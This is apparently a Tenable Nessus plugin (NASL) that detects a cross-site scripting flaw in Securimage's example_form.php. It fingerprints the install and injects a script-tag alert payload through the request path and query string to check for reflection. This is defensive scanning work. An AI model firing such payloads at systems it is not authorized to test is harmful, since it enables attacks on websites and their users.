#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66545);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/01/15 03:38:17 $");

  script_bugtraq_id(59796);
  script_osvdb_id(93439);

  script_name(english:"Securimage example_form.php XSS");
  script_summary(english:"Attempts to exploit an XSS flaw in example_form.php script");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by a cross-
site scripting vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Securimage on the remote host contains a flaw that
allows a remote cross-site scripting vulnerability because the
application does not validate the 'REQUEST_URI' variable in the
'example_form.php' script.  An attacker may be able to leverage this to
inject arbitrary HTML and script code into a user's browser to be
executed within the security context of the affected site.");
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5139.php");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/05/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:phpcaptcha:securimage");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
appname = "Securimage";

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/securimage", cgi_dirs()));
else dirs = make_list(cgi_dirs());

install_urls = make_list();
vuln_url = make_list();
exploited = 0;

xss_test = '"><script>alert(/'+ unixtime() + SCRIPT_NAME + '/)</script>';

foreach dir (dirs)
{
  res = http_send_recv3(
    method     : "GET",
    item       : dir+ "/captcha.html",
    port       : port,
    exit_on_fail : TRUE
  );
  if (
    'src="./securimage_show.php?sid=<?php' >< res[2] &&
    'md5(uniqid())' >< res[2] &&
    'alt="CAPTCHA Image' >< res[2]
  )
  {
    install_urls = make_list(install_urls, build_url(qs:dir+"/captcha.html", port:port));

    if (test_cgi_xss(
         port     : port,
         dirs     : make_list(dir),
         cgi      : '/example_form.php/' + unixtime(),
         qs       : xss_test,
         pass_str : xss_test,
         pass_re  : "<title>Securimage Example Form</title>"
    )) exploited++;
  }
}

if (exploited) exit(0);     # nb: 'test_cgi_xss()' handles reporting.
else
{
  installs = max_index(install_urls);
  if (installs == 0) audit(AUDIT_WEB_APP_NOT_INST, appname, port);
  else if (installs == 1) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_urls[0]);
  else exit(0, "None of the " + appname + " installs (" + join(install_urls, sep:" & ") + ") are affected.");
}
